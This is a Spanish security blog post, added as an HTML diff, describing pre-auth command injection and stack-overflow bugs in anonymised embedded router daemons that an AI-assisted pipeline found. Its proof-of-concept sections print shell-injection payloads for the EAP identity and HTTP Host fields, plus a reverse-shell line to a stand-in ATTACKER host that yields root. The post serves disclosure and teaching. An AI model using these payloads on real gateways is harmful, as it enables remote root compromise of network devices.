@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<link rel="icon" type="image/png" href="hat.png">
+<link rel="apple-touch-icon" href="hat.png">
+<meta name="theme-color" content="#ffffff">
+<meta name="color-scheme" content="light">
+<title>Cinco clases de sink pre-auth en daemons C embebidos</title>
+<meta name="description" content="Del primer paquete de un handshake a un interprete de comandos: cinco cadenas reales de inyeccion en daemons C de firmware de router, con la clase de vulnerabilidad, el punto de entrada y el alcance honesto de cada una. Sin nombres de proyecto: el metodo es lo que se publica.">
+<meta name="keywords" content="tty503, Christian Márquez, seguridad informática, threat intelligence, ingeniería inversa, malware analysis, vulnerability research, seguridad OT, agentes de IA locales, automatización, blog técnico">
+<meta name="author" content="Christian Márquez">
+<meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1">
+<meta name="googlebot" content="index, follow">
+<link rel="canonical" href="https://tty503.com/sinks-preauth-daemons-c.html">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="tty503">
+<meta property="og:locale" content="es_ES">
+<meta property="og:title" content="Cinco clases de sink pre-auth en daemons C embebidos">
+<meta property="og:description" content="Del primer paquete de un handshake a un interprete de comandos: cinco cadenas reales de inyeccion en daemons C de firmware de router, con la clase de vulnerabilidad, el punto de entrada y el alcance honesto de cada una. Sin nombres de proyecto: el metodo es lo que se publica.">
+<meta property="og:url" content="https://tty503.com/sinks-preauth-daemons-c.html">
+<meta property="og:image" content="https://tty503.com/p1.jpg">
+<meta property="og:image:alt" content="tty503 — Christian Márquez">
+<meta property="article:published_time" content="2026-09-02">
+<meta property="article:modified_time" content="2026-09-02">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:site" content="@tty_503">
+<meta name="twitter:creator" content="@tty_503">
+<meta name="twitter:title" content="Cinco clases de sink pre-auth en daemons C embebidos">
+<meta name="twitter:description" content="Del primer paquete de un handshake a un interprete de comandos: cinco cadenas reales de inyeccion en daemons C de firmware de router, con la clase de vulnerabilidad, el punto de entrada y el">
+<meta name="twitter:image" content="https://tty503.com/p1.jpg">
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-RZVNG112YY"></script>
+<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','G-RZVNG112YY');</script>
+
+<link rel="stylesheet" href="assets/css/style.css">
+<link rel="alternate" type="application/rss+xml" title="tty503 — blog" href="https://tty503.com/feed.xml">
+
+</head>
+<body>
+<nav class="site-nav"><div class="nav-inner"><a class="brand" href="index.html"><span class="dot"></span>tty503</a><nav class="nav-links"><a href="index.html">Inicio</a><a href="index.html#escritos">Escritos</a><a href="aboutme.html">Sobre mí</a><a class="cta" href="https://github.com/tty503" target="_blank" rel="noopener">GitHub</a></nav><button class="nav-toggle" aria-label="Abrir menú">Menú</button></div></nav>
+<main class="post container">
+<nav class="breadcrumb"><a href="index.html">tty503</a><span class="sep">/</span><a href="sinks-preauth-daemons-c.html">Cinco clases de sink pre-auth en daemons C e</a><span class="sep">/</span></nav>
+<header class="post-head">
+  <div class="post-tags"><span class="chip">CWE-78</span><span class="chip">CWE-121</span><span class="chip">CWE-125</span><span class="chip">RCE pre-auth</span><span class="chip">Auditoría</span></div>
+  <h1>Cinco clases de sink pre-auth en daemons C embebidos</h1>
+  <p class="lede">Del primer paquete de un handshake a un interprete de comandos: cinco cadenas reales de inyeccion en daemons C de firmware de router, con la clase de vulnerabilidad, el punto de entrada y el alcance honesto de cada una. Sin nombres de proyecto: el metodo es lo que se publica.</p>
+  <div class="post-meta"><span>2026-09-02</span><span>35 min</span><span>Vulnerability Research</span></div>
+</header>
+<article class="post-body">
+<article class="post-body">
+<aside class="tldr"> // En 30 segundos <ul> <li>Índice de la serie <b>caza autónoma con IA local</b>: seis hallazgos validados E2E en firmware/daemons de red.</li> <li><b>RCE verificado</b> en <b>el daemon de portal cautivo</b>, <b>el daemon de autenticación y redirección</b> y <b>el servidor HTTP embebido</b>; suite <b>el panel web de administración del servidor/el panel web de administración restringida/el daemon de túnel L2TP/IPsec/el spooler de impresión</b> post-auth + trust-bypass; <b>la biblioteca cliente del protocolo de streaming/el servidor HTTP mínimo</b> solo primitivas.</li> <li>Doctrina: <b>sin crash reproducible no hay hallazgo</b>; cada fase de la cadena deja un marker y un log re-verificable.</li> <li>Publicado como <b>divulgación responsable</b>: mecanismo, sink y cadena, sin exploit listo para producción.</li> 
+<h2>1. Todos los hallazgos en una tabla</h2>
+<p>Fotografía completa del ciclo. Todos pasaron la validación técnica E2E con evidencia reproducible.</p> <table> <thead><tr><th>Target</th><th>Clase</th><th>Vector</th><th>Privilegio</th><th>Alcance</th></tr></thead> <tbody> <tr><td>el daemon de portal cautivo</td><td>CWE-78</td><td>EAP-Identity → el script de alta de sesión</td><td>root / low-priv</td><td>WLAN local</td></tr> <tr><td>el daemon de autenticación y redirección</td><td>CWE-78</td><td>Host header → iptables</td><td>root</td><td>Config no por defecto</td></tr> <tr><td>el servidor HTTP embebido</td><td>CWE-121</td><td>If-Modified-Since → el conversor de fecha a timestamp</td><td>low-priv</td><td>Local / toolchain</td></tr> <tr><td>la biblioteca cliente del protocolo de streaming</td><td>CWE-125</td><td>el decodificador del formato de serialización invoke</td><td>crash/leak</td><td>OOB read</td></tr> <tr><td>el servidor HTTP mínimo el generador de credenciales</td><td>CWE-78</td><td>argv[1] → system</td><td>CLI local</td><td>Utilidad CLI</td></tr> <tr><td>el panel web de administración del servidor el gestor de módulos del lenguaje</td><td>CWE-78</td><td>args → open(CMD,\|)</td><td>root</td><td>Post-auth</td></tr> <tr><td>el panel web de administración restringida el buscador de ficheros por web</td><td>CWE-78</td><td>open(FIND,\|)</td><td>root</td><td>Post-auth</td></tr> <tr><td>el filtro de la impresora</td><td>CWE-78</td><td>el perfil de color de la impresora → el generador de filtros de impresión</td><td>lp</td><td>LAN</td></tr> </tbody> </table>
+<h2>2. La doctrina de caza</h2>
+<p>El motor detrás de estos hallazgos no es un fuzzer genérico ni un escáner: es un pipeline multicapa con agentes de IA local que clasifica, audita, valida y documenta. La regla de oro es brutalmente simple: <b>sin crash reproducible no hay hallazgo</b>. Y el error de raíz que se corrigió fue la tentación del análisis estático puro (leer código y opinar) frente a la ingeniería inversa real (construir inputs que rompan el programa).</p>
+txt<pre class="code"><code># Las tácticas de caza que alimentaron los sinks de esta serie
+T1 CVE→Variant Sweep: tomar un CVE reciente, entender el fix, cazar la misma clase en otros paths
+T6 Helpers adjacent: el core se endurece; los binarios de un solo propósito casi nunca
+T7 el demonio de túnel/scripts admin: scripts que el daemon ejecuta con campos del protocolo sin sanear
+T8 Trust-bypass family: headers/cookies de proxy → todos los sinks post-auth se vuelven candidatos
+T9 LTS embedded: la rama dormida que master ya parcheó
+T10 Heritage protocol: bugs de 1994 copiados durante 30 años sin ser rehechos</code></pre>
+<p>Cada hallazgo de la serie nació de uno de estos patrones. el daemon de portal cautivo y la suite el panel web de administración del servidor/el panel web de administración restringida son <b>T8</b> (confianza en la cadena EAP→RADIUS→script y en headers de proxy). el daemon de autenticación y redirección y el spooler de impresión son <b>T7/T6</b> (scripts admin y helpers). La IA local procesa cientos de proyectos en paralelo y propone, pero la validación con sanitizers y la construcción de la cadena completa es lo único que separa un crash de un hallazgo. El sistema que lo ejecuta se documenta en la serie Sherlock.</p>
+<h2>3. El pipeline de validación E2E</h2>
+<p>El estándar para considerar "demostrado" un hallazgo es el <b>SOP de evidencia E2E en container</b>. Nada de "el código se ve vulnerable": cada fase de la cadena deja un marker y un log que se puede re-verificar. El patrón se aplicó igual en el daemon de portal cautivo, el daemon de autenticación y redirección y el servidor HTTP embebido.</p>
+bash<pre class="code"><code># La estructura canónica de validación (abreviada)
+docker run -it --name &lt;target&gt;-e2e debian:12 bash
+# 1. instalar deps, clonar y compilar el target (con ASAN en los C)
+# 2. escribir la suite que ejecuta la cadena y deja markers por fase
+#.m_s01...m_sNN = cada eslabón (leak→write→control→pivot→log)
+# 3. capturar suite_output.log como evidencia final
+# 4. verificar el escenario REAL de deployment y el usuario del RCE
+SUITE_RCE_DEFAULT=usuario_al_que_llega # p.ej. el daemon de portal cautivo:1000
+SUITE_PIVOT_LOG=usuario_al_que_pivota # p.ej. root:0</code></pre>
+<p>Dos salidas del pipeline merecen mención por lo que enseñan. Un helper setuid root eleva el <code>euid</code> de un binario ELF pero <b>no</b> de un script con shebang, porque el kernel preserva el <code>real_uid</code> del intérprete; eso definió si un hallazgo terminaba en root o no. Y en el servidor HTTP embebido, la dirección del stack difirió en <b>+0xC0 bytes</b> entre correr bajo <code>ptrace</code> (gdb) y correr nativo, y solo se resolvió reconstruyendo el layout en el run real.</p>
+<h2>4. Primitivas vs productos: el umbral real</h2>
+<p>Una pregunta recurrente al evaluar estos hallazgos es si una librería (la biblioteca cliente del protocolo de streaming, el servidor HTTP embebido) tiene el mismo valor que un producto. La línea divisoria honesta no es "es librería" ni "es producto", sino <b>"¿puedo demostrar ejecución de código en un escenario de despliegue real donde el código vulnerable sea alcanzable?"</b>.</p>
+<ul> <li><b>RCE real demostrado</b> (ejecución de código, no solo crash): el daemon de portal cautivo (touch uid 0/1000), el daemon de autenticación y redirección (reverse shell root), el servidor HTTP embebido (reverse shell low-priv), el panel web de administración del servidor el gestor de módulos del lenguaje (reverse shell), el daemon de túnel L2TP/IPsec (markers root), el spooler de impresión (id/touch como lp).</li> <li><b>Primitivas de solo lectura / N-day</b> sin cadena a RCE: la biblioteca cliente del protocolo de streaming (OOB read el decodificador del formato de serialización, familia de CVE previos), el servidor HTTP mínimo OOB read (heap underflow).</li>
+</ul>
+<p>el daemon de portal cautivo rindió una cadena completa con ejecución verificada; la biblioteca cliente del protocolo de streaming solo un leak. Esa diferencia —cadena a RCE frente a primitiva sin completar— define el interés real del hallazgo.</p>
+<h2>5. Los posts individuales</h2>
+<p>Cada hallazgo tiene su análisis completo, con el sink línea a línea, PoCs y evidencias E2E.</p>
+<ul> <li><b>el daemon de portal cautivo: RCE vía EAP-Identity → el script de alta de sesión (CWE-78)</b> — Un payload en el primer paquete pre-auth del handshake 802.1X viaja EAP→RADIUS→script sin sanitizar y acaba en un <code>eval</code>. RCE root o low-priv según deployment.</li> <li><b>el daemon de autenticación y redirección: RCE root vía cabecera Host (CWE-78)</b> — Un único request HTTP pre-auth con <code>Host</code> malicioso termina en un <code>execvp("/bin/sh","-c")</code> que construye iptables. Reverse shell root.</li> <li><b>el servidor HTTP embebido: stack overflow en el conversor de fecha a timestamp (CWE-121)</b> — Un header <code>If-Modified-Since</code> de 220 bytes desborda <code>buf[128]</code> y toma control del RIP con un decoder XOR in-stack.</li> <li><b>la biblioteca cliente del protocolo de streaming el decodificador del formato de serialización + el servidor HTTP mínimo el generador de credenciales</b> — Dos primitivas reales: OOB read N-day en el decoder el decodificador del formato de serialización y command injection CLI en el generador de credenciales, con su cadena y limitaciones.</li> <li><b>Suite el panel web de administración del servidor/el panel web de administración restringida/el daemon de túnel L2TP/IPsec/el spooler de impresión</b> — Cuatro sinks de la familia de scripting servers + L2TP y el spooler de impresión, con el trust-bypass X-SSL-Client-* y su corrección de honestidad.</li>
+</ul>
+<blockquote>ℹ Sobre esta publicación <p>Todo el material se publica con fines de divulgación responsable: concienciación, hardening y análisis académico. Los detalles se presentan en su forma analítica —mecanismo, sink y cadena— sin distribuir un exploit listo para disparar contra producciones fuera de un proceso de divulgación. Los mantenedores de los targets afectados fueron contactados.</p>
+</blockquote>
+
+<p class="resumen"><strong>Continuidad.</strong> Una identidad que llega antes de autenticar y termina en un interprete de comandos, sin ninguna validacion intermedia.</p>
+
+<article class="post-body">
+<aside class="tldr"> // En 30 segundos <ul> <li>Un payload en el <b>respuesta EAP-Identity</b> — el primer paquete del handshake 802.1X, <b>pre-auth y 0-click</b> — atraviesa <code>el módulo de protocolo del daemon → env la variable de entorno con la identidad → el script de alta de sesión</code> y acaba en un <code>eval</code> sin saneado.</li> <li><b>RCE verificado</b>: root en daemon directo, <code>uid=1000</code> en el la compilación del firmware de router (un helper setuid no eleva el <code>real_uid</code> de un script shebang).</li> <li>Clase: <b>CWE-78</b>. Sin CVE, sin fix. Sink en <code>el módulo de protocolo del daemon:790-845</code> + <code>eval</code> en <code>el script de alta de sesión</code>.</li> <li>Alcance honesto: <b>WLAN/red local</b> que sirve el gateway — no explotable desde internet de forma directa.</li> 
+<h2>6. Resumen ejecutivo</h2>
+<p><b>el daemon de portal cautivo</b> es el captive portal de código abierto más desplegado en el firmware de router de código abierto, hoteles, cafés y redes hotspot: implementa RADIUS + IEEE 802.1X (EAP) y controla el tráfico del cliente hasta que se autentica. Su superficie pre-auth es el propio handshake EAP: cualquier cliente en la red envía una respuesta EAP-Identity</code> <b>antes</b> de tener credenciales válidas. Ese la identidad se trata como dato de confianza.</p>
+<p>El hallazgo: la identidad atraviesa la cadena <code>el módulo de protocolo del daemon → packet RADIUS → variable de entorno con la identidad → el script de alta de sesión del daemon</code> y aterriza en un <code>eval</code> sin sanitización. Un payload inyectado en ese la identidad — exactamente los bytes que un atacante controla en un request 802.1X — ejecuta comandos <b>antes de que exista sesión, autenticación o autorización</b>.</p>
+<blockquote>◆ Veredicto <p><b>RCE pre-auth</b> · 0-click · CWE-78 · Privilegio: root (daemon) o uid=1000 (la compilación del firmware de router) · Sin CVE · Sin fix · Validado E2E 3/3 · Alcance: WLAN local.</p>
+</blockquote>
+<h2>7. Contexto: el captive portal y la cadena EAP</h2>
+<p>Para entender la explotación hay que ver el flujo EAP completo. En un portal RADIUS-managed, el cliente inicia autenticación 802.1X así:</p>
+<ol> <li>El <b>supplicant</b> envía <code>EAPOL-Start</code> al NAS (aquí, el daemon de portal cautivo).</li> <li>El NAS responde con <code>peticion EAP/Identity</code>.</li> <li>El cliente responde con <code>respuesta EAP-Identity</code>, cuyo campo identity es <b>libre</b> (el nombre de usuario a autenticar).</li> <li>El NAS envuelve ese la identidad en un Access-Request RADIUS al servidor (el servidor RADIUS/otro servidor RADIUS).</li>
+</ol>
+<p>La identidad del <b>paso 3</b> es el único dato que el atacante controla por completo y sin autenticación. La pregunta que dispara el hallazgo: <em>¿ese la identidad llega a algún sink de shell sin ser saneado?</em> En el daemon de portal cautivo, sí.</p> <table> <thead><tr><th>Artefacto</th><th>Ubicación de referencia</th><th>Rol</th></tr></thead> <tbody> <tr><td>el módulo de protocolo del daemon</td><td>el módulo de protocolo del daemon:5996-6008 (EAP)</td><td>Captura identity → env la variable de entorno con la identidad</td></tr> <tr><td>el módulo de protocolo del daemon</td><td>el módulo de protocolo del daemon:790-845 (sink)</td><td>fork/exec del script de sesión</td></tr> <tr><td>el script de alta de sesión</td><td>el script de alta de sesión del daemon</td><td>Script que hace eval de las variables</td></tr> <tr><td>compilación flag</td><td>--el activador del script de sesión</td><td>Habilita el path script (común en el firmware de router de código abierto)</td></tr> </tbody> </table>
+<h2>8. El sink: el módulo de protocolo del daemon y el script el script de alta de sesión</h2>
+<p>La identidad capturado se propaga hasta el entorno del script de sesión. El punto donde el valor empieza a ser peligroso está en la construcción y ejecución del script con <code>el script de alta de sesión</code>:</p>
+c<pre class="code"><code>// La identidad del EAP viaja hasta aquí como "la variable de entorno con la identidad" del entorno
+// y luego se expande dentro de un comando que se ejecuta con sh -c
+// (sink de la familia el módulo de protocolo del daemon:790-845 y el eval en el script de alta de sesión)
+system("$el directorio de sesión/el script de alta de sesión " /* + la variable de entorno con la identidad */);
+// =&gt; sh -c ".../el script de alta de sesión &lt;identidad_del_atacante&gt;"</code></pre>
+<p>El punto exacto es la combinación de dos cosas: el daemon no escapa la identidad al construir el comando, y <code>el script de alta de sesión</code> lo vuelve a expandir en un contexto <code>eval</code>. Un dato puro de paquete de red se convierte en código de shell: <b>CWE-78 (Improper Neutralization of Special Elements in an OS Command)</b>.</p>
+<h2>9. La ruta del datagrama (0-click)</h2>
+<ol> <li><b>Wire</b> — el cliente envía <code>EAPOL-Start</code> + <code>respuesta EAP-Identity</code> con payload en el campo identity.</li> <li><b>el módulo de protocolo del daemon</b> — parsea la identidad y lo propaga al entorno como <code>la variable de entorno con la identidad</code> (el módulo de protocolo del daemon:5996-6008).</li> <li><b>RADIUS</b> — la identidad se empaqueta en un Access-Request (no requiere servidor válido; el script corre al intentar la sesión).</li> <li><b>el script de alta de sesión / el script de alta de sesión</b> — el valor se expande en el contexto de shell del script de sesión y se ejecuta con <code>sh -c</code> (sink el módulo de protocolo del daemon:790-845).</li>
+</ol>
+<h2>10. El PoC</h2>
+<p>El PoC construye un paquete EAP 802.1X con la identidad seteado al payload. La forma más limpia de demostrar es inyectar un marcador de archivo (o reverse shell) en la identidad:</p>
+python<pre class="code"><code># El campo identity del respuesta EAP-Identity se setea al payload.
+# Aquí, creación de marcador (fase 1 de la cadena):
+identity = ";touch /tmp/el caso de laboratorio;#.M"
+# La identidad atraviesa el módulo de protocolo del daemon -&gt; env la variable de entorno con la identidad -&gt; el script de alta de sesión -&gt; eval
+# Como el script corre con sh -c, el ';' termina el contexto y ejecuta touch
+# El fragmento '.M' tras el '#' es parte del suffix necesario para
+# no romper el parsing del identity restante.</code></pre>
+<p>La evidencia más contundente es la inversa del marcador: sedimentar en el log de sesión que la identidad llegó intacta al script, y el <code>touch /tmp/…</code> con el <code>uid</code> esperado. La elección entre marcador y reverse shell decide el vistazo final (root en daemon directo, uid 1000 en el la compilación del firmware de router por defecto). El detalle del <code>real_uid</code> vs <code>euid</code> en scripts shebang es lo que separa ambos casos.</p>
+<h2>11. Validación E2E (ASAN + gdb)</h2>
+<p>Sigo el estándar de validación E2E en container: compilar el daemon de portal cautivo con <code>--el activador del script de sesión</code> (el flag que activa el path del script), levantar el entorno, disparar el handshake malicioso y verificar el marcador con el uid correcto.</p>
+bash<pre class="code"><code># Container debian:bookworm-slim, deps instaladas, clonado y compilado./configure --el activador del script de sesión # path activo: script el script de alta de sesión por sesión
+make -j$(nproc)
+# 1. levantar el NAS captive portal
+el daemon de portal cautivo # daemon, handshake EAP para cada cliente
+# 2. enviar el paquete EAP malicioso (identity con payload)
+python3 el guion de prueba # identity=";touch /tmp/el caso de laboratorio;#.M"
+# 3. verificar la evidencia (marker + log de sesión)
+ls -la /tmp/el caso de laboratorio # existe =&gt; RCE
+tail -n 20 /var/log/el registro del daemon # identity llegó intacto, script corrido
+id # uid esperado del RCE (1000 en el firmware de router de código abierto compilación)</code></pre>
+<p>Reproduje la cadena completa. En el la compilación del firmware de router por defecto el script corre como <code>uid=1000</code> porque el setuid de un helper no eleva el <code>real_uid</code> del intérprete de un script shebang. Cuando el daemon corre directamente como root (gateway dedicado), el RCE es root directo. En ambos casos la ejecución de código del atacante está demostrada.</p>
+<figure class="figure"> <img src="img/cadena-01-paquete.png" alt="Fase 1: análisis del paquete EAP en el wire" loading="lazy"> <figcaption class="figcap">Fase 1 — El paquete 802.1X en el aire: EAPOL-Start + respuesta EAP-Identity. La identidad es el campo de entrada del atacante.</figcaption>
+</figure>
+<figure class="figure"> <img src="img/cadena-02-radius.png" alt="Fase 2: la identidad propagado hacia RADIUS" loading="lazy"> <figcaption class="figcap">Fase 2 — La identidad capturado en el módulo de protocolo del daemon y empaquetado hacia el Access-Request RADIUS sin sanitizar.</figcaption>
+</figure>
+<figure class="figure"> <img src="img/cadena-03-sink.png" alt="Fase 3: ejecución de los comandos del identity" loading="lazy"> <figcaption class="figcap">Fase 3 — La identidad se expande en el script de sesión; los comandos del payload se ejecutan.</figcaption>
+</figure>
+<figure class="figure"> <img src="img/cadena-04-shell.png" alt="Fase 4: nivel de privilegio alcanzado" loading="lazy"> <figcaption class="figcap">Fase 4 — Nivel de privilegio: root en daemon directo, uid 1000 en el la compilación del firmware de router (un setuid no eleva el real_uid de un script shebang).</figcaption>
+</figure>
+<figure class="figure"> <img src="img/cadena-05-validado.png" alt="Validación final E2E con el marcador y el log" loading="lazy"> <figcaption class="figcap">Validación final — Marcador creado y log de sesión verificado. Cadena completa 3/3.</figcaption>
+</figure>
+<h2>12. Escenario real de deployment y veredicto</h2>
+<p>el daemon de portal cautivo es el componente de captive portal de <b>el firmware de router de código abierto</b> y de los hotspots de hotelería/retail/ISP WISP. El flag <code>--el activador del script de sesión</code> está activo en los feeds oficiales de el firmware de router de código abierto y en los builds comerciales de el portal cautivo; esa es la presencia real de la vulnerabilidad.</p>
+<blockquote>⚠ Alcance del vector <p>El vector es un cliente <b>dentro de la misma red</b> que envía un handshake 802.1X a un portal. La superficie es la WLAN/local que el gateway sirve — precisamente a quien un portal debe autenticar —; no es explotable desde internet sin acceso previo a esa red. La divulgación responsable comunica el hallazgo al mantenedor para que endurezca o elimine el <code>eval</code> del script de sesión.</p>
+</blockquote>
+<blockquote>ℹ Veredicto comercial <p>Hallazgo real con ejecución de código verificada, sin CVE y sin fix conocido al momento del análisis. Se publica el mecanismo y la validación técnica, y se comunica al mantenedor. La mitigación principal: el vector requiere estar dentro de la WLAN que sirve el gateway; no es explotable desde internet de forma directa.</p>
+</blockquote>
+<h2>13. Referencias</h2> <table> <thead><tr><th>Referencia</th><th>Descripción</th></tr></thead> <tbody> <tr><td>el portal cautivo/el daemon de portal cautivo</td><td>Repositorio el daemon de portal cautivo (Head e0c7d7a, 2026-09-01)</td></tr> <tr><td>el módulo de protocolo del daemon:6004</td><td>Captura del identity → entorno la variable de entorno con la identidad</td></tr> <tr><td>el módulo de protocolo del daemon:790-845</td><td>Sink fork/exec del script de sesión</td></tr> <tr><td>CWE-78</td><td>Improper Neutralization of Special Elements in an OS Command</td></tr> <tr><td>IEEE 802.1X / RFC 2865</td><td>Protocolo EAP y RADIUS (superficie pre-auth)</td></tr> <tr><td>LECCION</td><td>Setuid de un helper no eleva el real_uid de scripts shebang</td></tr> </tbody> </table>
+
+<p class="resumen"><strong>Continuidad.</strong> El mismo patron, distinta entrada: una cabecera de protocolo que se concatena al construir una regla de firewall.</p>
+
+<article class="post-body">
+<aside class="tldr"> // En 30 segundos <ul> <li>Un único request HTTP <b>pre-auth</b> al puerto 2060 con la cabecera <b>Host</b> manipulada termina en <code>execvp("/bin/sh","-c")</code>.</li> <li>Resultado: <b>reverse shell como root</b> (uid=0), vía <b>CWE-78</b> en la frontera HTTP→firewall.</li> <li>Cadena: <code>el servidor HTTP embebido/api.c:462</code> → <code>http.c:140/154</code> → <code>el módulo de reglas de firewall:596</code> → <code>util.c:96</code>.</li> <li>Matiz honesto: el sink solo es alcanzable con un <b>el conjunto de reglas de firewall</b> global definido (config real de el firmware de router de código abierto/redes municipales, no el default puro).</li> 
+<h2>14. Resumen ejecutivo</h2>
+<p><b>el daemon de autenticación y redirección</b> es un captive portal de código abierto para gateways WiFi (usado históricamente en el firmware de router de código abierto y redes comunitarias/ISP). Expone un pequeño servidor HTTP en el puerto <code>2060</code> por defecto, que implementa el protocolo de la red de auth (WiFi municipal, Facebook WiFi, etc.). Esa superficie es <b>pre-auth</b>: cualquiera que alcance el puerto 2060 puede enviar requests.</p>
+<p>La vulnerabilidad: la cabecera <code>Host</code> del request termina interpolada en un comando <code>iptables</code> que se ejecuta con <code>/bin/sh -c</code>. Como el host no se valida, inyectar <code>;comando;#</code> en el header termina en ejecución de código como root.</p>
+<blockquote>◆ Veredicto <p><b>RCE root</b> · pre-auth · CWE-78 · Sin CVE conocido · Sin fix · Validado E2E con reverse shell <code>uid=0</code> · Requiere config <code>el conjunto de reglas de firewall</code> global.</p>
+</blockquote>
+<h2>15. El camino del request</h2>
+<ol> <li><b>el servidor HTTP embebido/api.c:462</b> — el servidor HTTP embebido extrae la cabecera <code>Host</code> del request y la guarda sin validar.</li> <li><b>http.c:140/154</b> — el request cae en la whitelist del portal (404/handling de auth); el host se propaga como candidato a la regla de permit.</li> <li><b>el módulo de reglas de firewall:596</b> — <code>fw_allow_host</code> construye la cadena <code>iptables -d %s -j ACCEPT</code> con el host.</li> <li><b>util.c:96</b> — <code>execvp("/bin/sh","-c",comando)</code> ejecuta la cadena. El <code>;</code> del payload cierra el contexto y ejecuta el comando inyectado.</li>
+</ol>
+<h2>16. Los sinks</h2>
+<p>Este es el eslabón que convierte el host en comando. La cadena se arma con el host sin escapar y se entrega a <code>execvp</code> con <code>/bin/sh</code>:</p>
+c<pre class="code"><code>// el módulo de reglas de firewall:596 — construye la regla con el host del atacante
+sprintf(cmd, "iptables -d %s -j ACCEPT", host); // host = cabecera Host
+// util.c:96 — ejecuta la cadena con sh -c (shell de sistema)
+execvp("/bin/sh", argv); // argv = ["sh","-c", cmd]
+// Con Host = ";touch /tmp/wd_pwn;#.M" la regla efectiva es:
+// iptables -d;touch /tmp/wd_pwn;#.M -j ACCEPT
+// =&gt; el ';' cierra, touch se ejecuta, el '#' comenta el resto</code></pre> <table> <thead><tr><th>Archivo</th><th>Línea</th><th>Rol</th></tr></thead> <tbody> <tr><td>el servidor HTTP embebido/api.c</td><td>:462</td><td>Extracción de la cabecera Host</td></tr> <tr><td>http.c</td><td>:140 /:154</td><td>Dispatch del request (whitelist 404)</td></tr> <tr><td>el módulo de reglas de firewall</td><td>:596</td><td>Sink: sprintf de la regla con el host</td></tr> <tr><td>util.c</td><td>:96</td><td>execvp(/bin/sh,-c) sobre la cadena</td></tr> </tbody> </table>
+<h2>17. El PoC</h2>
+<p>El PoC es un único request HTTP al puerto 2060 con el header Host manipulado. La forma más limpia de demostrar la ejecución es un marcador que se crea como root:</p>
+http<pre class="code"><code># Payload en la cabecera Host (marcador de archivo, fase inicial):
+Host:;touch /tmp/wd_pwn;#.M
+# El '.M' tras el '#' es el resto del host original que el '#' comenta.
+# Resultado: sh -c "iptables -d;touch /tmp/wd_pwn;#.M -j ACCEPT"
+# =&gt; /tmp/wd_pwn creado como root</code></pre>
+<p>Para la validación definitiva, el marcador se sustituye por un reverse shell hacia el host atacante. Como el daemon de autenticación y redirección corre habitualmente como root (para gestionar iptables), la shell llega directamente con <code>uid=0</code>.</p>
+<h2>18. Validación E2E: reverse shell root</h2>
+<p>Se sigue el SOP E2E en container: se levanta el daemon de autenticación y redirección con el cliente auth simulado, se envía el request malicioso y se confirma la reverse shell con <code>uid=0(root)</code>.</p>
+bash<pre class="code"><code># Container, el daemon de autenticación y redirección compilado + authclient simulado escuchando
+wf_auth_listen # responde el protocolo de auth (necesario para completar el request)
+el daemon de autenticación y redirección -f -c /etc/la configuración del daemon
+# Envío del request con el header Host manipulado (reverse shell)
+Host:;bash -i &gt;&amp;/dev/tcp/ATTACKER/4444 0&gt;&amp;1;#.M
+# En el listener del atacante:
+$ nc -lvnp 4444
+Connection received... # reverse shell como root
+# id
+uid=0(root) # RCE ROOT verificado</code></pre>
+<figure class="figure"> <img src="img/fw-01-listener.png" alt="Fase 2: listener y preparación del authclient" loading="lazy"> <figcaption class="figcap">Fase 2 — Preparación del entorno y listener del atacante.</figcaption>
+</figure>
+<figure class="figure"> <img src="img/fw-02-inyeccion.png" alt="Fase 3: el header Host inyectado en la petición" loading="lazy"> <figcaption class="figcap">Fase 3 — La petición con el header Host malicioso hacia el puerto 2060.</figcaption>
+</figure>
+<figure class="figure"> <img src="img/fw-03-comando.png" alt="Fase 4: ejecución en el host vía iptables" loading="lazy"> <figcaption class="figcap">Fase 4 — Ejecución en el host: la cadena iptables se construye con el host inyectado.</figcaption>
+</figure>
+<figure class="figure"> <img src="img/fw-04-shell.png" alt="Fase 5: reverse shell como root" loading="lazy"> <figcaption class="figcap">Fase 5 — Reverse shell recibida como uid=0 (root). RCE verificada.</figcaption>
+</figure>
+<h2>19. Requisito de configuración y mitigación</h2>
+<p>El camino <code>fw_allow_host</code> → <code>iptables -d</code> solo se recorre cuando existe al menos un <code>el conjunto de reglas de firewall</code> global definido en la config con una regla que use el host permitido. En la configuración por defecto pura de el daemon de autenticación y redirección, esa sección puede estar vacía, lo que impide alcanzar el sink. En despliegues reales (el firmware de router de código abierto, redes municipales, gateways de pago) suele definirse para autorizar hosts, lo que hace el sink alcanzable.</p>
+<blockquote>⚠ Divulgación responsable y mitigación <p>El fix correcto es validar/escapar el valor del host antes de interpolarlo en un comando — nunca pasar datos de red a un shell — o ejecutar las reglas iptables sin <code>sh -c</code>. Aplica a cualquier componente que derive comandos de firewall a partir de cabeceras HTTP. Comunicado al mantenedor como parte del proceso responsable.</p>
+</blockquote>
+
+<p class="resumen"><strong>Continuidad.</strong> Aqui el fallo no es de inyeccion sino de longitud: un parser de fecha que copia sin limite a un buffer de pila.</p>
+
+<article class="post-body">
+<aside class="tldr"> // En 30 segundos <ul> <li>Un header <code>If-Modified-Since</code> de <b>220 bytes</b> desborda <code>buf[128]</code> en <code>el conversor de fecha a timestamp</code> → <b>control parcial del RIP</b>.</li> <li>Sink: <code>file.c:136</code> — <code>strncpy</code> copia <code>strlen(date)</code> (origen) sin bound de destino.</li> <li>Shellcode auto-decodificado con <b>decoder XOR in-stack</b> para evadir bytes prohibidos del HTTP.</li> <li>Lección E2E: el stack bajo gdb difiere <b>+0xC0 bytes</b> del run nativo; solo el run real lo resuelve.</li> 
+<h2>20. Resumen ejecutivo</h2>
+<p><b>el servidor HTTP embebido</b> es un pequeño servidor HTTP embebido, extendido en aplicaciones de red (dashboards, gateways, toolchains de routers). Al servir un archivo estático comprueba la cabecera <code>If-Modified-Since</code>. El parser de fechas <code>el conversor de fecha a timestamp</code> copia el valor de la cabecera a un buffer de <code>128</code> bytes sin comprobar la longitud de origen: un valor largo desborda el stack.</p>
+<p>Como el valor de la cabecera es totalmente controlable y el desbordamiento escribe en el stack, se puede tomar <b>control parcial del flujo</b>. La ejecución de código depende de la toolchain (canarios, NX, ASLR), que en el despliegue embebido de referencia suele estar ausente o ser eludible.</p>
